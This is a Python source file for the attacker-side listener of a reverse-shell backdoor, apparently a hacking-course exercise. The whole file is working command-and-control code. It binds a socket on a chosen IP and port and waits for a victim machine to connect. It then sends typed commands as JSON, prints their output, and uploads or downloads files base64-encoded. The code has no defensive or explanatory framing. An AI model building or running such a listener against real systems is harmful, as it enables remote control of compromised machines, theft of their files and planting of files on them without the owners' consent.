import optparse
import socket
import base64
import simplejson


def get_user_input():
    opts = optparse.OptionParser()
    opts.add_option("-i", "--ip", dest="ip", help="IP Address")
    opts.add_option("-p", "--port", dest="port", help="Port")
    inputs = opts.parse_args()[0]
    return inputs


class SocketListener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Socket listening on port " + str(port))
        (self.connection, self.client_address) = listener.accept()
        print("Socket connected " + str(self.client_address))

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024).decode()
                return simplejson.loads(data)
            except ValueError:
                continue

    def command_execute(self, command_input):
        self.json_send(command_input)
        if command_input == "exit":
            self.connection.close()
            exit(0)
        return self.json_receive()

    def save_file(self, file_path, content):
        with open(file_path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Download successful"

    def get_file(self, file_path):
        with open(file_path, "rb") as file:
            return base64.b64encode(file.read())

    def start_listening(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    file_content = self.get_file(command_input[1])
                    command_input.append(file_content)
                command_output = self.command_execute(command_input)

                if command_input[0] == "download" and "Error" not in command_output:
                    command_output = self.save_file(command_input[1], command_output)
            except Exception:
                command_output = "Error"
            print(command_output)


user_input = get_user_input()
socket_obj = SocketListener(user_input.ip, user_input.port)
socket_obj.start_listening()
